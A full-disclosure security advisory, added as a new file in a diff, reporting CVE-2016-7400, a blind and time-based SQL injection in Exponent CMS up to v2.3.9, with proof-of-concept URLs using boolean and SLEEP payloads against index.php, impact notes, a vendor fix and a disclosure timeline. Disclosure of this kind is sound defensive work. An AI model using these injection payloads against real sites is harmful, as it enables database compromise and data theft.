@@ -1,0 +1,91 @@
+=============================================
+MGC ALERT 2016-005
+- Original release date: September 09, 2016
+- Last revised:  September 20, 2016
+- Discovered by: Manuel GarcAa CA!rdenas
+- Severity: 7,1/10 (CVSS Base Score)
+- CVE-ID: CVE-2016-7400
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Blind SQL Injection in Exponent CMS <= v2.3.9
+
+II. BACKGROUND
+-------------------------
+Exponent CMS is a free, open source, open standards modular enterprise
+software framework and content management system (CMS) written in the
+programming language PHP.
+
+III. DESCRIPTION
+-------------------------
+This bug was found using the portal in the index.php page.
+
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application.
+
+It is possible to inject SQL code in the "index.php" page
+"/exponent/index.php".
+
+IV. PROOF OF CONCEPT
+-------------------------
+The following URL have been confirmed to all suffer from Blind SQL
+injection and Time Based SQL Injection.
+
+Blind SQL Injection POC:
+
+/exponent/index.php'%20or%201%3d1--%20
+
+/exponent/index.php'%20or%201%3d2--%20
+
+Time Based SQL Injection POC:
+
+/exponent/index.php'%20OR%20SLEEP(1)--%20   (2 seconds of response)
+
+/exponent/index.php'%20OR%20SLEEP(30)--%20   (30 seconds of response)
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Exponent CMS <= v2.3.9
+
+VII. SOLUTION
+-------------------------
+Vendor fix the vulnerability:
+http://www.exponentcms.org/news/updated-patches-released-for-v2-1-4-and-v2-2-3-1473726129-0.50310400
+
+VIII. REFERENCES
+-------------------------
+http://www.exponentcms.org/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel GarcAa CA!rdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+September 09, 2016 1: Initial release
+September 20, 2016 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+September 09, 2016 1: Vulnerability acquired by Manuel Garcia Cardenas
+September 09, 2016 2: Send to vendor
+September 12, 2016 3: Vendor fix vulnerability
+September 20, 2016 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
